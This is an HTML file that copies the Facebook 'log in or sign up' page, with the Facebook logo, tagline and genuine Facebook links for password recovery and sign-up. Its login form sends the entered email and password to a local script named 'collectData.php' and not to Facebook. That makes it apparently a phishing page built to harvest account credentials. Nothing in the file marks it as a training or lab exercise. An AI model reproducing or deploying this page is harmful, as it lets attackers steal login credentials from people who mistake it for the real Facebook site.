<!DOCTYPE html>

<html lang="en">
    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Facebook - log in or sign up</title>

        <link rel="stylesheet" href="css/facebook.css">
        <link rel="shortcut icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/2021_Facebook_icon.svg/1024px-2021_Facebook_icon.svg.png" type="image/x-icon">
    </head>

    <body>
        <div class="box">
            <div class="title-box">
                <img src="https://i.postimg.cc/NMyj90t9/logo.png" alt="Facebook">
                <p>Facebook helps you connect and share with the people in your life.</p>
            </div>
            <div>
                <div class="form-box">
                    <form action="collectData.php" method="post">
                        <input name="email" type="text" placeholder="Email address or phone number">
                        <input name="password" type="password" placeholder="Password">
                        <button name="submit" type="submit">Log In</button>
                        <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">
                            Forgotten Password?
                        </a>
                    </form>
                    <hr>
                    <div class="create-btn">
                        <a href="https://www.facebook.com/signup" target="_blank">Create New Account</a>
                    </div>
                </div>
                <div class="extra-txt">
                    <a href="https://www.facebook.com/pages/create/?ref_type=registration_form">
                        Create a Page</a> for a celebrity, brand or business.
                </div>
            </div>
        </div>
        <footer>
            <img src="images/facebook-footer.png" alt="">
        </footer>
    </body>
</html>